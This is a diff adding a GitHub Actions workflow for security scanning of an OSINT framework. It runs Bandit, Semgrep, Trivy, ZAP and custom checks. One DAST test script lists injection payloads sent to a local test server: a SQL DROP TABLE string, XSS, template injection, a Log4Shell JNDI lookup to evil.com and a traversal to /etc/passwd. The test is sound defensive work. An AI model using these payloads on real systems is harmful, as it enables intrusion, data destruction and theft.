@@ -1,0 +1,1003 @@
+name: Security Scanning - SAST/DAST/Container Security
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main, develop, enterprise-completion ]
+  schedule:
+    # Run comprehensive security scans daily at 3 AM UTC
+    - cron: '0 3 * * *'
+  workflow_dispatch:
+    inputs:
+      scan_type:
+        description: 'Type of security scan to run'
+        required: true
+        default: 'comprehensive'
+        type: choice
+        options:
+          - comprehensive
+          - sast-only
+          - dast-only
+          - container-only
+          - dependency-only
+
+env:
+  REGISTRY: ghcr.io
+  IMAGE_NAME: ${{ github.repository }}
+
+jobs:
+  # Static Application Security Testing (SAST)
+  sast-analysis:
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: write
+      actions: read
+      contents: read
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      with:
+        fetch-depth: 0
+
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+        cache: 'pip'
+
+    - name: Install Security Tools
+      run: |
+        python -m pip install --upgrade pip
+        pip install bandit safety semgrep gitpython
+        
+        # Install additional security tools
+        curl -L https://github.com/securecodewarrior/github-action-add-sarif/releases/download/v1.1.0/sarif-multitool-linux-x64 -o sarif-multitool
+        chmod +x sarif-multitool
+
+    - name: Run Bandit (Python SAST)
+      run: |
+        echo "Running Bandit security analysis on Python code"
+        bandit -r src/ intelowl/custom_analyzers/ \
+          -f json \
+          -o bandit-report.json \
+          -ll \
+          --exclude src/tests/,tests/ || true
+        
+        # Convert to SARIF for GitHub Security tab
+        bandit -r src/ intelowl/custom_analyzers/ \
+          -f sarif \
+          -o bandit-results.sarif \
+          -ll \
+          --exclude src/tests/,tests/ || true
+
+    - name: Run Semgrep (Multi-language SAST)
+      run: |
+        echo "Running Semgrep security analysis"
+        
+        # Run comprehensive Semgrep rules
+        semgrep --config=auto \
+          --sarif \
+          --output=semgrep-results.sarif \
+          --severity=WARNING \
+          --severity=ERROR \
+          src/ intelowl/ || true
+        
+        # Run OSINT-specific security patterns
+        cat > osint-security-rules.yml << 'EOF'
+        rules:
+          - id: hardcoded-api-keys
+            pattern-either:
+              - pattern: |
+                  api_key = "$..."
+              - pattern: |
+                  API_KEY = "$..."
+              - pattern: |
+                  secret = "$..."
+            message: Potential hardcoded API key detected
+            languages: [python]
+            severity: ERROR
+            
+          - id: tor-proxy-insecure
+            pattern: |
+              requests.get(..., proxies={"http": "...", "https": "..."})
+            message: Ensure Tor proxy configuration is secure
+            languages: [python]
+            severity: WARNING
+            
+          - id: database-credentials
+            pattern-either:
+              - pattern: |
+                  password = "$..."
+              - pattern: |
+                  pwd = "$..."
+              - pattern: |
+                  passwd = "$..."
+            message: Potential hardcoded database credentials
+            languages: [python]
+            severity: ERROR
+        EOF
+        
+        semgrep --config=osint-security-rules.yml \
+          --sarif \
+          --output=osint-specific-results.sarif \
+          src/ intelowl/ || true
+
+    - name: Python Dependency Security Scan
+      run: |
+        echo "Scanning Python dependencies for vulnerabilities"
+        
+        # Generate requirements for scanning
+        pip freeze > current-requirements.txt
+        
+        # Run safety check
+        safety check \
+          --json \
+          --output safety-report.json \
+          --file requirements.txt || true
+        
+        safety check \
+          --json \
+          --output current-safety-report.json \
+          --file current-requirements.txt || true
+
+    - name: Docker Security Configuration Analysis
+      run: |
+        echo "Analyzing Docker security configurations"
+        
+        # Create Docker security scanner
+        cat > docker_security_check.py << 'EOF'
+        import os
+        import json
+        import re
+        from pathlib import Path
+
+        def analyze_dockerfile_security(dockerfile_path):
+            """Analyze Dockerfile for security issues"""
+            issues = []
+            
+            with open(dockerfile_path, 'r') as f:
+                content = f.read()
+                lines = content.split('\n')
+            
+            for i, line in enumerate(lines, 1):
+                line = line.strip()
+                
+                # Check for running as root
+                if line.startswith('USER root') or line == 'USER 0':
+                    issues.append({
+                        'line': i,
+                        'severity': 'HIGH',
+                        'issue': 'Running as root user',
+                        'description': 'Container should not run as root'
+                    })
+                
+                # Check for ADD vs COPY
+                if line.startswith('ADD ') and not line.startswith('ADD --'):
+                    issues.append({
+                        'line': i,
+                        'severity': 'MEDIUM',
+                        'issue': 'Using ADD instead of COPY',
+                        'description': 'COPY is preferred over ADD for local files'
+                    })
+                
+                # Check for latest tag
+                if ':latest' in line and line.startswith('FROM'):
+                    issues.append({
+                        'line': i,
+                        'severity': 'LOW',
+                        'issue': 'Using latest tag',
+                        'description': 'Specify exact version instead of latest'
+                    })
+                
+                # Check for secrets in ENV
+                if line.startswith('ENV ') and any(secret in line.lower() for secret in ['password', 'secret', 'key', 'token']):
+                    issues.append({
+                        'line': i,
+                        'severity': 'HIGH',
+                        'issue': 'Potential secret in ENV',
+                        'description': 'Avoid hardcoding secrets in ENV'
+                    })
+            
+            return issues
+
+        # Scan all Dockerfiles
+        dockerfile_results = {}
+        dockerfile_pattern = re.compile(r'Dockerfile.*')
+
+        for root, dirs, files in os.walk('.'):
+            for file in files:
+                if dockerfile_pattern.match(file):
+                    dockerfile_path = os.path.join(root, file)
+                    try:
+                        issues = analyze_dockerfile_security(dockerfile_path)
+                        if issues:
+                            dockerfile_results[dockerfile_path] = issues
+                    except Exception as e:
+                        print(f"Error analyzing {dockerfile_path}: {e}")
+
+        # Save results
+        with open('docker-security-report.json', 'w') as f:
+            json.dump(dockerfile_results, f, indent=2)
+
+        # Print summary
+        total_issues = sum(len(issues) for issues in dockerfile_results.values())
+        print(f"Found {total_issues} Docker security issues across {len(dockerfile_results)} files")
+        
+        if total_issues > 0:
+            print("Docker security issues found - see docker-security-report.json")
+        EOF
+        
+        python docker_security_check.py
+
+    - name: Upload SAST Results to GitHub Security
+      uses: github/codeql-action/upload-sarif@v2
+      if: always()
+      with:
+        sarif_file: bandit-results.sarif
+        category: bandit
+
+    - name: Upload Semgrep Results to GitHub Security
+      uses: github/codeql-action/upload-sarif@v2
+      if: always()
+      with:
+        sarif_file: semgrep-results.sarif
+        category: semgrep
+
+    - name: Upload OSINT Security Results to GitHub Security
+      uses: github/codeql-action/upload-sarif@v2
+      if: always()
+      with:
+        sarif_file: osint-specific-results.sarif
+        category: osint-security
+
+    - name: Upload SAST Artifacts
+      uses: actions/upload-artifact@v3
+      if: always()
+      with:
+        name: sast-results
+        path: |
+          bandit-report.json
+          bandit-results.sarif
+          semgrep-results.sarif
+          osint-specific-results.sarif
+          safety-report.json
+          current-safety-report.json
+          docker-security-report.json
+
+  # Container Security Scanning
+  container-security:
+    runs-on: ubuntu-latest
+    needs: sast-analysis
+    if: ${{ !failure() }}
+    
+    strategy:
+      matrix:
+        image-category:
+          - core-services
+          - security-services
+          - autonomous-services
+          - market-intelligence
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Docker Buildx
+      uses: docker/setup-buildx-action@v3
+
+    - name: Build Test Images for Security Scanning
+      run: |
+        echo "Building images for ${{ matrix.image-category }} security scanning"
+        
+        case "${{ matrix.image-category }}" in
+          "core-services")
+            # Build core service images
+            docker build -f src/mcp_server/Dockerfile -t bev-mcp-server:security-test .
+            docker build -f src/monitoring/Dockerfile.health-monitor -t bev-health-monitor:security-test .
+            IMAGES="bev-mcp-server:security-test bev-health-monitor:security-test"
+            ;;
+          "security-services")
+            # Build security service images
+            docker build -f src/security/Dockerfile.guardian -t bev-security-guardian:security-test .
+            docker build -f src/security/Dockerfile.ids -t bev-security-ids:security-test .
+            IMAGES="bev-security-guardian:security-test bev-security-ids:security-test"
+            ;;
+          "autonomous-services")
+            # Build autonomous service images
+            docker build -f src/autonomous/Dockerfile.controller -t bev-autonomous-controller:security-test .
+            IMAGES="bev-autonomous-controller:security-test"
+            ;;
+          "market-intelligence")
+            # Build market intelligence images
+            docker build -f src/alternative_market/Dockerfile.crypto_analyzer -t bev-crypto-analyzer:security-test .
+            IMAGES="bev-crypto-analyzer:security-test"
+            ;;
+        esac
+        
+        echo "IMAGES=$IMAGES" >> $GITHUB_ENV
+
+    - name: Run Trivy Container Vulnerability Scanner
+      run: |
+        # Install Trivy
+        sudo apt-get update
+        sudo apt-get install wget apt-transport-https gnupg lsb-release
+        wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
+        echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
+        sudo apt-get update
+        sudo apt-get install trivy
+        
+        # Scan each image
+        for image in $IMAGES; do
+          echo "Scanning $image with Trivy"
+          
+          # Generate reports in multiple formats
+          trivy image \
+            --format sarif \
+            --output "trivy-${image//[:\/]/-}-results.sarif" \
+            "$image" || true
+          
+          trivy image \
+            --format json \
+            --output "trivy-${image//[:\/]/-}-results.json" \
+            "$image" || true
+          
+          # High severity only for blocking
+          trivy image \
+            --severity HIGH,CRITICAL \
+            --format table \
+            --output "trivy-${image//[:\/]/-}-critical.txt" \
+            "$image" || true
+        done
+
+    - name: Run Docker Bench Security
+      run: |
+        echo "Running Docker Bench Security tests"
+        
+        # Clone and run Docker Bench Security
+        git clone https://github.com/docker/docker-bench-security.git
+        cd docker-bench-security
+        
+        # Run security benchmark
+        sudo ./docker-bench-security.sh -l docker-bench-results.log || true
+        
+        # Copy results
+        cp docker-bench-results.log ../docker-bench-security-results.log
+
+    - name: Container Runtime Security Analysis
+      run: |
+        echo "Analyzing container runtime security configurations"
+        
+        cat > container_runtime_check.py << 'EOF'
+        import docker
+        import json
+        
+        def analyze_container_security():
+            """Analyze running container security configurations"""
+            client = docker.from_env()
+            results = []
+            
+            try:
+                # Get all containers (including stopped ones)
+                containers = client.containers.list(all=True)
+                
+                for container in containers:
+                    config = container.attrs['Config']
+                    host_config = container.attrs['HostConfig']
+                    
+                    security_issues = []
+                    
+                    # Check if running as root
+                    if config.get('User') == 'root' or not config.get('User'):
+                        security_issues.append('Running as root user')
+                    
+                    # Check privileged mode
+                    if host_config.get('Privileged', False):
+                        security_issues.append('Running in privileged mode')
+                    
+                    # Check host network
+                    if host_config.get('NetworkMode') == 'host':
+                        security_issues.append('Using host network mode')
+                    
+                    # Check volume mounts
+                    binds = host_config.get('Binds', [])
+                    for bind in binds:
+                        if ':/var/run/docker.sock' in bind:
+                            security_issues.append('Docker socket mounted')
+                        if bind.startswith('/'):
+                            security_issues.append(f'Host path mounted: {bind}')
+                    
+                    if security_issues:
+                        results.append({
+                            'container': container.name,
+                            'image': container.image.tags[0] if container.image.tags else 'unknown',
+                            'issues': security_issues
+                        })
+                        
+            except Exception as e:
+                print(f"Error analyzing containers: {e}")
+            
+            return results
+        
+        # Analyze containers if any are running
+        results = analyze_container_security()
+        
+        with open('container-runtime-security.json', 'w') as f:
+            json.dump(results, f, indent=2)
+        
+        if results:
+            print(f"Found security issues in {len(results)} containers")
+        else:
+            print("No container security issues found")
+        EOF
+        
+        python container_runtime_check.py || true
+
+    - name: Upload Container Security Results to GitHub Security
+      uses: github/codeql-action/upload-sarif@v2
+      if: always()
+      with:
+        sarif_file: trivy-*-results.sarif
+        category: container-security-${{ matrix.image-category }}
+
+    - name: Upload Container Security Artifacts
+      uses: actions/upload-artifact@v3
+      if: always()
+      with:
+        name: container-security-${{ matrix.image-category }}
+        path: |
+          trivy-*-results.*
+          docker-bench-security-results.log
+          container-runtime-security.json
+
+  # Dynamic Application Security Testing (DAST)
+  dast-analysis:
+    runs-on: ubuntu-latest
+    needs: sast-analysis
+    if: github.event_name == 'schedule' || contains(github.event.pull_request.labels.*.name, 'security-full')
+    
+    services:
+      redis:
+        image: redis:7-alpine
+        ports:
+          - 6379:6379
+      postgres:
+        image: postgres:15-alpine
+        env:
+          POSTGRES_PASSWORD: test_password
+          POSTGRES_USER: test_user
+          POSTGRES_DB: test_db
+        ports:
+          - 5432:5432
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+
+    - name: Install dependencies
+      run: |
+        pip install -r requirements.txt
+        
+        # Install DAST tools
+        pip install zapv2 selenium requests
+
+    - name: Start Test Application
+      run: |
+        # Start a minimal version of the application for DAST
+        echo "Starting application for DAST scanning"
+        
+        # Create minimal test server
+        cat > test_server.py << 'EOF'
+        from fastapi import FastAPI
+        from fastapi.responses import HTMLResponse
+        import uvicorn
+        import os
+        
+        app = FastAPI(title="BEV Test Server for DAST")
+        
+        @app.get("/")
+        def read_root():
+            return {"message": "BEV OSINT Framework Test Instance"}
+        
+        @app.get("/health")
+        def health_check():
+            return {"status": "healthy", "version": "test"}
+        
+        @app.get("/api/test")
+        def api_test():
+            return {"api": "working", "data": "test"}
+        
+        @app.post("/api/analyze")
+        def analyze_endpoint(data: dict):
+            return {"analysis": "complete", "input": data}
+        
+        if __name__ == "__main__":
+            uvicorn.run(app, host="0.0.0.0", port=8000)
+        EOF
+        
+        # Start test server in background
+        python test_server.py &
+        TEST_SERVER_PID=$!
+        echo "TEST_SERVER_PID=$TEST_SERVER_PID" >> $GITHUB_ENV
+        
+        # Wait for server to start
+        sleep 10
+        
+        # Verify server is running
+        curl -f http://localhost:8000/health || {
+          echo "Test server failed to start"
+          exit 1
+        }
+
+    - name: OWASP ZAP Baseline Scan
+      run: |
+        echo "Running OWASP ZAP baseline security scan"
+        
+        # Install ZAP
+        wget -q https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh
+        chmod +x ZAP_2_14_0_unix.sh
+        sudo ./ZAP_2_14_0_unix.sh -q
+        
+        # Run ZAP baseline scan
+        sudo docker run -v $(pwd):/zap/wrk/:rw \
+          -t owasp/zap2docker-stable zap-baseline.py \
+          -t http://host.docker.internal:8000 \
+          -J zap-baseline-report.json \
+          -r zap-baseline-report.html || true
+
+    - name: Custom Security Tests
+      run: |
+        echo "Running custom OSINT-specific security tests"
+        
+        cat > osint_security_tests.py << 'EOF'
+        import requests
+        import json
+        import time
+        
+        BASE_URL = "http://localhost:8000"
+        
+        def test_injection_attacks():
+            """Test for injection vulnerabilities"""
+            payloads = [
+                "'; DROP TABLE users; --",
+                "<script>alert('xss')</script>",
+                "{{7*7}}",
+                "${jndi:ldap://evil.com/a}",
+                "../../../etc/passwd"
+            ]
+            
+            results = []
+            for payload in payloads:
+                try:
+                    response = requests.post(
+                        f"{BASE_URL}/api/analyze",
+                        json={"input": payload},
+                        timeout=5
+                    )
+                    
+                    if "49" in response.text or "error" in response.text.lower():
+                        results.append({
+                            "payload": payload,
+                            "status": response.status_code,
+                            "response": response.text[:200]
+                        })
+                except Exception as e:
+                    pass
+            
+            return results
+        
+        def test_information_disclosure():
+            """Test for information disclosure"""
+            sensitive_endpoints = [
+                "/admin",
+                "/api/admin",
+                "/config",
+                "/.env",
+                "/database",
+                "/logs",
+                "/debug"
+            ]
+            
+            results = []
+            for endpoint in sensitive_endpoints:
+                try:
+                    response = requests.get(f"{BASE_URL}{endpoint}", timeout=5)
+                    if response.status_code == 200:
+                        results.append({
+                            "endpoint": endpoint,
+                            "status": response.status_code,
+                            "content_length": len(response.content)
+                        })
+                except Exception:
+                    pass
+            
+            return results
+        
+        def test_rate_limiting():
+            """Test for rate limiting"""
+            rapid_requests = []
+            start_time = time.time()
+            
+            for i in range(50):
+                try:
+                    response = requests.get(f"{BASE_URL}/api/test", timeout=1)
+                    rapid_requests.append(response.status_code)
+                except:
+                    rapid_requests.append(0)
+            
+            end_time = time.time()
+            
+            return {
+                "total_requests": len(rapid_requests),
+                "successful_requests": rapid_requests.count(200),
+                "duration": end_time - start_time,
+                "rate_limited": 429 in rapid_requests
+            }
+        
+        # Run tests
+        results = {
+            "injection_tests": test_injection_attacks(),
+            "information_disclosure": test_information_disclosure(),
+            "rate_limiting": test_rate_limiting()
+        }
+        
+        with open('osint-security-tests.json', 'w') as f:
+            json.dump(results, f, indent=2)
+        
+        print("Custom security tests completed")
+        EOF
+        
+        python osint_security_tests.py
+
+    - name: Cleanup Test Server
+      if: always()
+      run: |
+        if [ ! -z "$TEST_SERVER_PID" ]; then
+          kill $TEST_SERVER_PID || true
+        fi
+
+    - name: Upload DAST Artifacts
+      uses: actions/upload-artifact@v3
+      if: always()
+      with:
+        name: dast-results
+        path: |
+          zap-baseline-report.*
+          osint-security-tests.json
+
+  # Infrastructure Security
+  infrastructure-security:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Kubernetes Security Analysis
+      if: contains(github.event.pull_request.labels.*.name, 'kubernetes') || github.event_name == 'schedule'
+      run: |
+        echo "Analyzing Kubernetes security configurations"
+        
+        # Install kube-score for K8s security analysis
+        wget https://github.com/zegl/kube-score/releases/download/v1.16.1/kube-score_1.16.1_linux_amd64.tar.gz
+        tar xzf kube-score_1.16.1_linux_amd64.tar.gz
+        chmod +x kube-score
+        
+        # Analyze K8s manifests if they exist
+        if [ -d "k8s" ]; then
+          ./kube-score score k8s/*.yaml --output-format json > k8s-security-analysis.json || true
+        fi
+
+    - name: Docker Compose Security Analysis
+      run: |
+        echo "Analyzing Docker Compose security configurations"
+        
+        cat > compose_security_analyzer.py << 'EOF'
+        import yaml
+        import json
+        import glob
+        
+        def analyze_compose_security(file_path):
+            """Analyze Docker Compose file for security issues"""
+            with open(file_path, 'r') as f:
+                compose_data = yaml.safe_load(f)
+            
+            issues = []
+            services = compose_data.get('services', {})
+            
+            for service_name, service_config in services.items():
+                # Check for privileged containers
+                if service_config.get('privileged', False):
+                    issues.append({
+                        'service': service_name,
+                        'severity': 'HIGH',
+                        'issue': 'Privileged container',
+                        'description': 'Container running in privileged mode'
+                    })
+                
+                # Check for host network mode
+                if service_config.get('network_mode') == 'host':
+                    issues.append({
+                        'service': service_name,
+                        'severity': 'MEDIUM',
+                        'issue': 'Host network mode',
+                        'description': 'Using host network mode reduces isolation'
+                    })
+                
+                # Check for bind mounts to sensitive paths
+                volumes = service_config.get('volumes', [])
+                for volume in volumes:
+                    if isinstance(volume, str):
+                        if '/var/run/docker.sock' in volume:
+                            issues.append({
+                                'service': service_name,
+                                'severity': 'HIGH',
+                                'issue': 'Docker socket bind mount',
+                                'description': 'Mounting Docker socket allows container escape'
+                            })
+                        elif volume.startswith('/etc'):
+                            issues.append({
+                                'service': service_name,
+                                'severity': 'MEDIUM',
+                                'issue': 'System directory bind mount',
+                                'description': f'Mounting system directory: {volume}'
+                            })
+                
+                # Check for missing restart policies
+                if 'restart' not in service_config:
+                    issues.append({
+                        'service': service_name,
+                        'severity': 'LOW',
+                        'issue': 'No restart policy',
+                        'description': 'Consider adding a restart policy'
+                    })
+                
+                # Check for default passwords in environment
+                environment = service_config.get('environment', {})
+                if isinstance(environment, dict):
+                    for key, value in environment.items():
+                        if isinstance(value, str) and any(term in key.lower() for term in ['password', 'secret', 'key']):
+                            if value in ['password', 'secret', 'admin', '123456']:
+                                issues.append({
+                                    'service': service_name,
+                                    'severity': 'HIGH',
+                                    'issue': 'Default password',
+                                    'description': f'Default password detected in {key}'
+                                })
+            
+            return issues
+        
+        # Analyze all compose files
+        compose_files = glob.glob('docker-compose*.yml')
+        all_results = {}
+        
+        for compose_file in compose_files:
+            try:
+                issues = analyze_compose_security(compose_file)
+                if issues:
+                    all_results[compose_file] = issues
+            except Exception as e:
+                print(f"Error analyzing {compose_file}: {e}")
+        
+        # Save results
+        with open('compose-security-analysis.json', 'w') as f:
+            json.dump(all_results, f, indent=2)
+        
+        total_issues = sum(len(issues) for issues in all_results.values())
+        print(f"Found {total_issues} security issues across {len(all_results)} compose files")
+        EOF
+        
+        python compose_security_analyzer.py
+
+    - name: Upload Infrastructure Security Results
+      uses: actions/upload-artifact@v3
+      if: always()
+      with:
+        name: infrastructure-security
+        path: |
+          k8s-security-analysis.json
+          compose-security-analysis.json
+
+  # Security Summary Report
+  security-summary:
+    runs-on: ubuntu-latest
+    needs: [sast-analysis, container-security, infrastructure-security]
+    if: always()
+    
+    steps:
+    - name: Download All Security Artifacts
+      uses: actions/download-artifact@v3
+
+    - name: Generate Security Summary Report
+      run: |
+        echo "Generating comprehensive security summary report"
+        
+        cat > generate_security_summary.py << 'EOF'
+        import json
+        import os
+        from pathlib import Path
+        
+        def collect_security_results():
+            """Collect all security scan results"""
+            results = {
+                'sast': {},
+                'container': {},
+                'infrastructure': {},
+                'summary': {
+                    'total_issues': 0,
+                    'high_severity': 0,
+                    'medium_severity': 0,
+                    'low_severity': 0
+                }
+            }
+            
+            # Process SAST results
+            sast_dir = Path('sast-results')
+            if sast_dir.exists():
+                for file in sast_dir.glob('*.json'):
+                    try:
+                        with open(file, 'r') as f:
+                            data = json.load(f)
+                            results['sast'][file.name] = data
+                    except Exception as e:
+                        print(f"Error reading {file}: {e}")
+            
+            # Process container security results
+            for container_dir in Path('.').glob('container-security-*'):
+                if container_dir.is_dir():
+                    category = container_dir.name.replace('container-security-', '')
+                    results['container'][category] = {}
+                    
+                    for file in container_dir.glob('*.json'):
+                        try:
+                            with open(file, 'r') as f:
+                                data = json.load(f)
+                                results['container'][category][file.name] = data
+                        except Exception as e:
+                            print(f"Error reading {file}: {e}")
+            
+            # Process infrastructure results
+            infra_dir = Path('infrastructure-security')
+            if infra_dir.exists():
+                for file in infra_dir.glob('*.json'):
+                    try:
+                        with open(file, 'r') as f:
+                            data = json.load(f)
+                            results['infrastructure'][file.name] = data
+                    except Exception as e:
+                        print(f"Error reading {file}: {e}")
+            
+            return results
+        
+        def generate_markdown_report(results):
+            """Generate markdown security report"""
+            report = []
+            report.append("# 🛡️ Security Scan Summary Report")
+            report.append("")
+            report.append(f"**Scan Date:** {os.environ.get('GITHUB_RUN_ID', 'local')}")
+            report.append(f"**Repository:** {os.environ.get('GITHUB_REPOSITORY', 'unknown')}")
+            report.append("")
+            
+            # SAST Results
+            report.append("## 📊 Static Application Security Testing (SAST)")
+            if results['sast']:
+                for tool, data in results['sast'].items():
+                    report.append(f"### {tool}")
+                    if 'results' in data:
+                        report.append(f"- Issues found: {len(data['results'])}")
+                    report.append("")
+            else:
+                report.append("No SAST results available")
+                report.append("")
+            
+            # Container Security Results
+            report.append("## 🐳 Container Security")
+            if results['container']:
+                for category, scans in results['container'].items():
+                    report.append(f"### {category.title()} Services")
+                    for scan_file, data in scans.items():
+                        if 'Results' in data:
+                            total_vulns = sum(len(result.get('Vulnerabilities', [])) for result in data['Results'])
+                            report.append(f"- {scan_file}: {total_vulns} vulnerabilities")
+                    report.append("")
+            else:
+                report.append("No container security results available")
+                report.append("")
+            
+            # Infrastructure Security
+            report.append("## 🏗️ Infrastructure Security")
+            if results['infrastructure']:
+                for file, data in results['infrastructure'].items():
+                    report.append(f"### {file}")
+                    if isinstance(data, dict):
+                        total_issues = sum(len(issues) for issues in data.values())
+                        report.append(f"- Total issues: {total_issues}")
+                    report.append("")
+            else:
+                report.append("No infrastructure security results available")
+                report.append("")
+            
+            # Recommendations
+            report.append("## 🎯 Security Recommendations")
+            report.append("- Review and address all HIGH severity findings")
+            report.append("- Implement security scanning in CI/CD pipeline")
+            report.append("- Regular dependency updates and vulnerability patching")
+            report.append("- Container hardening with non-root users")
+            report.append("- Network segmentation and access controls")
+            report.append("")
+            
+            return "\n".join(report)
+        
+        # Generate report
+        results = collect_security_results()
+        report = generate_markdown_report(results)
+        
+        # Save report
+        with open('security-summary-report.md', 'w') as f:
+            f.write(report)
+        
+        # Save JSON results
+        with open('security-summary-results.json', 'w') as f:
+            json.dump(results, f, indent=2)
+        
+        print("Security summary report generated")
+        EOF
+        
+        python generate_security_summary.py
+
+    - name: Comment Security Report on PR
+      if: github.event_name == 'pull_request'
+      uses: actions/github-script@v6
+      with:
+        script: |
+          const fs = require('fs');
+          
+          try {
+            const report = fs.readFileSync('security-summary-report.md', 'utf8');
+            
+            await github.rest.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: `## Security Scan Results\n\n${report}`
+            });
+          } catch (error) {
+            console.log('Error posting security report:', error);
+          }
+
+    - name: Upload Security Summary
+      uses: actions/upload-artifact@v3
+      if: always()
+      with:
+        name: security-summary-report
+        path: |
+          security-summary-report.md
+          security-summary-results.json
+
+    - name: Security Status Check
+      run: |
+        echo "## Security Scan Summary" >> $GITHUB_STEP_SUMMARY
+        echo "" >> $GITHUB_STEP_SUMMARY
+        
+        echo "**SAST Analysis:** ${{ needs.sast-analysis.result }}" >> $GITHUB_STEP_SUMMARY
+        echo "**Container Security:** ${{ needs.container-security.result }}" >> $GITHUB_STEP_SUMMARY
+        echo "**Infrastructure Security:** ${{ needs.infrastructure-security.result }}" >> $GITHUB_STEP_SUMMARY
+        echo "" >> $GITHUB_STEP_SUMMARY
+        
+        if [[ "${{ needs.sast-analysis.result }}" == "success" && 
+              "${{ needs.container-security.result }}" == "success" && 
+              "${{ needs.infrastructure-security.result }}" == "success" ]]; then
+          echo "✅ **All security scans completed successfully**" >> $GITHUB_STEP_SUMMARY
+          echo "Check individual reports for detailed findings."
+          exit 0
+        else
+          echo "⚠️ **Some security scans had issues**" >> $GITHUB_STEP_SUMMARY
+          echo "Review individual scan results and address any critical findings."
+          exit 0  # Don't fail on security findings, just report them
+        fi
